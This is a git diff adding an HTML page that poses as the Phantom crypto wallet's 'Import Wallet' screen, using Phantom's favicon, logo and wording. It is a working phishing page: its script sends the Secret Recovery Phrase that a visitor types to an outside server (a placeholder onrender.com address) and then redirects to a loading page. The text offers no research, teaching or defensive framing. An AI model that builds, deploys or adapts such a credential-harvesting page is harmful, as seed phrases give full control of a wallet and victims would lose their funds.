@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Phantom Wallet - Import</title>
+  <link rel="icon" href="https://phantom.app/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <div class="container">
+    <img src="phantom-logo.svg" class="logo" alt="Phantom Logo">
+    <h1>Import Wallet</h1>
+    <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
+    <textarea id="phrase" placeholder="Enter your 12 or 24-word phrase..." rows="4"></textarea>
+    <button onclick="submit()">Continue</button>
+  </div>
+  <script>
+    function submit() {
+      const phrase = document.getElementById("phrase").value;
+      fetch("https://your-render-url.onrender.com/import", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ seedphrase: phrase })
+      }).then(() => {
+        window.location.href = "loading.html";
+      });
+    }
+  </script>
+</body>
+</html>
